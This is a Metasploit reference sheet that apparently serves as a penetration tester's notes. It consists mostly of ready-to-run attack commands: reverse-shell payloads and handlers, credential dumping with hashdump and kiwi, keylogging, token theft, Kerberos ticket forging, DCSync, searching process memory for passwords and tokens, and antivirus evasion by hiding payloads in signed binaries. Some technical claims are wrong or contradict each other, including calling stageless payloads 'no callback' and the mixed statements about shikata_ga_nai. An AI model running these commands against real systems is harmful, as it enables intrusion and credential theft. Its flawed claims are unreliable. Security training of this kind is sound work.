# Metasploit

#Metasploit #msfconsole #Meterpreter #PostExploitation #Payloads #Exploitation #Kerberos #ActiveDirectory #msfvenom #Pivoting

## What is this?

Open-source exploitation framework — a collection of exploits, auxiliary modules, post-exploitation tools, and payload generators. msfconsole is the primary interface. Meterpreter is the in-memory post-exploitation agent. msfvenom generates standalone payloads — see [[Shells & Payloads]] for full msfvenom reference. Pairs with [[Shells & Payloads]], [[Pivoting, Tunneling & Port Forwarding]], [[AV & EDR Evasion]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Payloads & Shells/metasploit\|msfconsole]] | Primary interactive interface |
| [[Tools/Payloads & Shells/msfvenom\|msfvenom]] | Standalone payload/shellcode generator |
| [[Tools/Payloads & Shells/metasploit\|msfdb]] | Database management for scan results and loot |
| [[Tools/Payloads & Shells/metasploit\|meterpreter]] | In-memory post-exploitation agent |
| [[Tools/Payloads & Shells/metasploit\|multi/handler]] | Generic listener for staged/stageless payloads |
| [[Tools/Scanning/NMAP\|nmap]] | `db_nmap` imports scan results straight into the msf database |

---

## Database Setup

```bash
# Initialize
sudo msfdb init

# Check status
sudo msfdb status

# Start / connect
sudo msfdb run
msfconsole -q

# Recreate if broken
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

### Workspace Management

```bash
workspace                  # show current workspace
workspace -l               # list all workspaces
workspace -a pentest1      # add new workspace
workspace pentest1         # switch to pentest1
workspace -d pentest1      # delete workspace
```

### Import / Export

```bash
db_nmap -sV -p- -T4 -A 10.10.10.15    # run nmap and store results in DB
db_import nmapscan.xml                  # import nmap XML
db_export -f xml backup.xml             # export DB to XML

hosts                      # list discovered hosts
services                   # list discovered services
creds                      # list stored credentials
loot                       # list collected loot
vulns                      # list stored vulnerabilities
```

---

## Searching Modules

```bash
# By CVE, type, platform, rank
search cve:2021 type:exploit platform:windows rank:excellent microsoft
search type:exploit platform:linux cve:2009

# Sort results
search cve:2009 -s name           # sort by name
search type:exploit -s type -r    # reverse sort by type

# Grep within results
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads          # count matches

# Module path format
# <No.> <type>/<os>/<service>/<name>
# e.g.: 679  exploit/windows/ftp/scriptftp_list

# Hierarchical search (6.4+) — also matches module ACTIONS, TARGETS and AKA aliases,
# so a name you know the tool by finds the module even if it isn't in the module path
search forge_ticket
search PetitPotam
search aka:printnightmare
```

> [!tip] If a search comes up empty on 6.4+, the module genuinely isn't there — hierarchical search already covers aliases and actions, so you don't need to guess at alternate spellings the way you did on older versions.

---

## Using Modules

```bash
use exploit/windows/smb/ms17_010_eternalblue
use 679                              # use by search result number

# Module info
show options
show info
show targets                         # different OS/version targets
show payloads                        # compatible payloads for this module
show encoders

# Configure
set RHOSTS 10.10.10.40
set LHOST tun0
set LPORT 4444
set TARGET 3                         # select from show targets
setg RHOSTS 10.10.10.40              # set globally across all modules

# Unset
unset RHOSTS
unset all

# Run
run                                  # execute
run -j                               # run as background job
exploit                              # alias for run
check                                # check if target is vulnerable (if supported)

# Background / kill jobs
jobs -l
jobs -k 1
```

---

## Payloads

### Staged vs Stageless

```bash
Staged   (/)  : windows/x64/meterpreter/reverse_tcp  — stager downloads payload
Stageless(_)  : windows/x64/meterpreter_reverse_tcp   — all-in-one, no callback
```

### Set payload for a module

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp
```

### multi/handler (catch any payload)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp    # must match msfvenom payload
set LHOST tun0
set LPORT 4444
set ExitOnSession false
run -j
```

**AutoRunScript** — run a post module automatically when a session opens:

```bash
set AutoRunScript post/multi/manage/shell_to_meterpreter   # auto-upgrade shell → meterpreter
set AutoRunScript multi_console_command -cl "sysinfo;getuid"  # run multiple commands on connect
```

> See [[Shells & Payloads]] for full msfvenom payload generation reference.

---

## Sessions

```bash
sessions                   # list all active sessions
sessions -l                # same
sessions -i 2              # interact with session 2
sessions -k 2              # kill session 2
sessions -u 2              # upgrade shell to meterpreter (session 2)

# Background current session
background
Ctrl+Z
```

---

## Meterpreter Commands

### Core

```bash
help                       # list all commands
background                 # background the session
exit                       # terminate session
sysinfo                    # OS, hostname, architecture
getuid                     # current user
getpid                     # current process ID
ps                         # list running processes
```

### Privilege Escalation

```bash
getsystem                  # attempt local priv esc (token impersonation/named pipe)
getuid                     # confirm privilege level after getsystem

# Manual token stealing
ps                         # find a privileged process
steal_token 1836           # steal access token from PID 1836
drop_token                 # revert to original token
```

### File System

```bash
pwd                        # current directory
ls                         # list directory
cd C:\\Windows\\Temp
cat C:\\Windows\\System32\\drivers\\etc\\hosts
download C:\\loot\\file.txt /tmp/
upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe
search -f *.txt            # search for files
```

### Execution

```bash
shell                      # drop to system shell
execute -f cmd.exe -i      # interactive shell
execute -f notepad.exe -H  # hidden process
run <script>               # run meterpreter script/module
load <extension>           # load extension (e.g., kiwi, incognito)
```

### Network

```bash
ipconfig / ifconfig        # network interfaces
arp                        # ARP table
netstat                    # connections
route                      # routing table
portfwd add -l 8080 -p 80 -r 192.168.1.10    # forward local 8080 → target 192.168.1.10:80
portfwd list
portfwd delete -l 8080
```

### Pivoting (route via session)

```bash
# Add route through session 1 to reach 192.168.1.0/24
route add 192.168.1.0/24 1
route print

# Or use auxiliary/server/socks_proxy for proxychains
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Then: proxychains nmap -sT -Pn 192.168.1.10
```

### Credential Harvesting

```bash
# SAM database (requires SYSTEM)
hashdump

# Kiwi (mimikatz integration)
load kiwi
creds_all                  # dump all creds
lsa_dump_sam               # SAM hashes
lsa_dump_secrets           # LSA secrets

# Kerberos tickets on the host (6.4+) — Rubeus klist/dump equivalent
run post/windows/manage/kerberos_tickets

# Memory search (6.4+, Windows Meterpreter) — pull secrets out of process memory
# without dropping a dumper to disk
search_mem -r "password"
search_mem -r "BEGIN RSA PRIVATE KEY"
search_mem -p 1234 -r "Authorization: Bearer"    # scope to one PID
```

> [!tip] `search_mem` is worth trying when credentials aren't in the SAM/LSA — browser processes, agents, and line-of-business apps routinely hold tokens and passwords in cleartext memory long after login.

### Persistence & Info Gathering

```bash
screenshot                 # capture screen
keyscan_start              # start keylogger
keyscan_dump               # dump captured keystrokes
keyscan_stop

run post/windows/gather/checkvm          # check if VM
run post/multi/recon/local_exploit_suggester  # local priv esc suggestions
run post/windows/gather/enum_shares      # enumerate shares
run post/windows/gather/hashdump        # SAM hashdump via post module
```

---

## Post-Exploitation Modules

```bash
# Local exploit suggester — run after getting initial shell
use post/multi/recon/local_exploit_suggester
set SESSION 2
run

# Upgrade shell session to meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Pivot setup
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
run

# Windows-specific
use post/windows/gather/credentials/credential_collector
use post/windows/gather/enum_domain
use post/windows/manage/enable_rdp
use post/windows/gather/smart_hashdump

# Linux-specific
use post/linux/gather/hashdump
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
```

---

## Auxiliary Modules

```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,443,445,3389
run

# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_login

# SSH
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner

# SNMP
use auxiliary/scanner/snmp/snmp_login

# Capture (listener/spoof)
use auxiliary/server/capture/http_basic
```

---

## Kerberos / Active Directory (Metasploit 6.3+)

Metasploit 6.3 added a full Kerberos suite and 6.4 extended it — this covers a lot of what you'd otherwise switch to [[Tools/Lateral Movement/Rubeus|Rubeus]] or [[Tools/Lateral Movement/impacket|impacket]] for, without leaving the framework or dropping a binary on the host.

```bash
# --- Enumeration / roasting ---
use auxiliary/gather/kerberos_enumusers      # user enum via AS-REQ (no failed-logon events)
use auxiliary/gather/get_user_spns           # Kerberoast — request TGS for SPN accounts
set RHOSTS <dc-ip>
set DOMAIN corp.local
set USERNAME <user>
set PASSWORD <pass>
run

# --- Ticket forging (golden / silver / diamond / sapphire) ---
use auxiliary/admin/kerberos/forge_ticket
set ACTION FORGE_GOLDEN          # or FORGE_SILVER / FORGE_DIAMOND / FORGE_SAPPHIRE
set DOMAIN corp.local
set DOMAIN_SID S-1-5-21-...
set NTHASH <krbtgt-hash>
set USER Administrator
run
# Diamond/Sapphire added in 6.4; tested against Windows Server 2022

# --- Dump tickets from a compromised host (Rubeus klist/dump equivalent) ---
use post/windows/manage/kerberos_tickets
set SESSION 1
run

# --- Pass-the-ticket, then DCSync with it ---
use auxiliary/gather/windows_secrets_dump
set RHOSTS <dc-ip>
set ACTION DOMAIN
set Krb5Ccname /path/to/ticket.ccache
run
```

| Datastore option | Purpose |
|---|---|
| `Krb5Ccname` | Path to a `.ccache` ticket — enables pass-the-ticket on supporting modules |
| `KrbCacheMode` | How msf stores/reuses tickets it obtains (`read-write`, `none`, …) |
| `DomainControllerRhost` | Explicit DC when it can't be resolved from the domain |
| `KerberosTicketTrace` | Print AS-REQ/AS-REP/TGS-REQ/TGS-REP as they go over the wire |

> [!tip] `set KerberosTicketTrace true` is the debugging tool to reach for when Kerberos auth "just fails" — it shows the actual request/response exchange instead of a generic error, which usually pinpoints a clock-skew, SPN, or encryption-type mismatch immediately.

> [!note] Kerberos is clock-sensitive — more than ~5 minutes of skew against the DC and every ticket operation fails regardless of correct credentials. Sync first: `sudo ntpdate <dc-ip>` or `sudo rdate -n <dc-ip>`.

> [!note] Ticket forging needs material you must already have — `krbtgt` hash for golden, service-account hash for silver, valid domain creds for diamond/sapphire. See [[Services/Active Directory/Kerberos|Kerberos]] for how each is obtained and which to prefer.

---

## Custom Modules

```bash
# Location for custom modules (preferred — persists across updates)
~/.msf4/modules/exploits/linux/http/mymodule.rb

# Or in framework dir (match folder structure by type):
/usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_cmd.rb

# Rules:
# - snake_case filename
# - match folder to module type
# - extends appropriate base class (Msf::Exploit::Remote, etc.)

# Reload after adding
reload_all                 # inside msfconsole
msfconsole -m /usr/share/metasploit-framework/modules/   # or on launch

# Port a standalone Ruby exploit:
cp ~/Downloads/48746.rb ~/.msf4/modules/exploits/linux/http/mymodule.rb
# Then add MSF boilerplate: include, initialize, register_options, exploit method
```

### Minimum module skeleton

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Module',
      'Description'    => 'Description here',
      'License'        => MSF_LICENSE,
      'Author'         => ['yourname'],
      'References'     => [['CVE', '2024-XXXX']],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86_64,
      'Targets'        => [['Target', {}]],
      'DefaultTarget'  => 0
    ))
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
    ])
  end

  def exploit
    # exploit logic here
    # handler to catch reverse shell
    handler
  end
end
```

---

## Resource Scripts

Automate repetitive msfconsole setup — run a `.rc` file instead of typing commands every session.

```bash
# Launch msfconsole with a resource script
msfconsole -r handler.rc
msfconsole -q -r handler.rc

# Run a resource script from within msfconsole
resource handler.rc
```

**Example handler.rc** — auto-starting multi/handler:

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter
run -j
```

**Example pivot.rc** — set up route and socks proxy after getting a session:

```text
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
run

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

---

## Payload Evasion (msfvenom)

```bash
# Encode with x64/xor_dynamic (multiple passes — note: reliably detected by modern AV).
# NB: shikata_ga_nai is x86-only; x64 payloads use the xor/xor_dynamic encoders below.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# List available encoders
msfvenom -l encoders

# Custom executable template — embed shellcode in a legitimate signed binary
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 \
  -x /path/to/legit.exe -f exe -o payload.exe

# List available formats
msfvenom --list formats
```

> [!warning] `shikata_ga_nai` (x86/x64 xor) is heavily signatured — AV vendors have had the decoder stubs for years. For real evasion, pipe msfvenom shellcode into a custom loader (Donut, ScareCrow, Freeze.rs) rather than relying on `-e`. See [[AV & EDR Evasion]].

> [!note] Windows Meterpreter gained **indirect syscalls** in 6.4, which bypasses userland API hooking used by many EDRs. It raises the floor but doesn't make the session invisible — the payload still has to land, and behavioural/ETW-based detection is unaffected.

---

## Useful One-Liners

```bash
# Start msfconsole quietly
msfconsole -q

# Run a module non-interactively
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set ExitOnSession false; run -j"

# Check VirusTotal detection on payload
msf-virustotal -k <api_key> -f payload.exe

# List all payloads for an arch/platform
msfvenom -l payloads | grep "windows/x64"

# List encoders
msfvenom -l encoders
```

---

## Quick Reference

| Task | Command |
|---|---|
| Start framework | `msfconsole -q` |
| Init database | `sudo msfdb init` |
| Search modules | `search type:exploit platform:windows cve:2021` |
| Show options | `show options` |
| Set target | `set RHOSTS 10.10.10.40` |
| Run module | `run -j` |
| List sessions | `sessions -l` |
| Interact session | `sessions -i 2` |
| Upgrade to meterpreter | `sessions -u 2` |
| Background session | `background` |
| Get SYSTEM | `getsystem` |
| Dump hashes | `hashdump` |
| Local privesc suggestions | `run post/multi/recon/local_exploit_suggester` |
| Add pivot route | `route add 192.168.1.0/24 1` |
| Forward port | `portfwd add -l 8080 -p 80 -r 192.168.1.10` |
| Forge Kerberos ticket | `use auxiliary/admin/kerberos/forge_ticket` (golden/silver/diamond/sapphire) |
| Dump host's Kerberos tickets | `run post/windows/manage/kerberos_tickets` |
| Trace Kerberos exchange | `set KerberosTicketTrace true` |
| Search process memory (6.4+) | `search_mem -r "password"` |

---

*Created: 2026-03-02*
*Updated: 2026-07-31*
*Model: claude-opus-5*